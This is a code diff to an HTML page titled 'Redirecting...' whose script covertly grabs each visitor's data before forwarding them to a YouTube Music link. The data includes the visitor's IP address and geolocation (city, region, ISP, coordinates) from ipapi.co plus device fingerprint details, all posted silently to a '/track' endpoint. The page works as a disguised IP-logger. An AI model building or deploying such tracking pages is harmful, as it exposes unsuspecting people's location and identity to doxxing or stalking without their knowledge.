@@ -3,26 +3,36 @@
 
 <head>
     <meta charset="UTF-8">
-    <title>Загрузка...</title>
+    <title>Переход...</title>
     <script>
         async function track() {
             try {
-                const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
+                const ipRes = await fetch('https://ipapi.co/ip/');
+                const ip = await ipRes.text();
+
+                const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+                const geo = await geoRes.json();
+
+                const info = {
+                    ip: geo.ip,
+                    city: geo.city,
+                    country: geo.country_name,
+                    region: geo.region,
+                    org: geo.org,
+                    loc: geo.latitude + ',' + geo.longitude,
+                    timezone: geo.timezone,
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    screen: `${screen.width}x${screen.height}`,
+                    device: /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
+                    timezoneOffset: new Date().getTimezoneOffset(),
+                    touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0
+                };
 
                 await fetch('/track', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        ip: data.ip,
-                        city: data.city,
-                        country: data.country_name,
-                        org: data.org,
-                        region: data.region,
-                        loc: data.latitude + ',' + data.longitude,
-                        timezone: data.timezone,
-                        userAgent: navigator.userAgent
-                    })
+                    body: JSON.stringify(info)
                 });
 
                 window.location.href = "https://music.youtube.com/watch?v=Kswz8FCJmKg&si=NmoCRGUkQtvhX4wK";
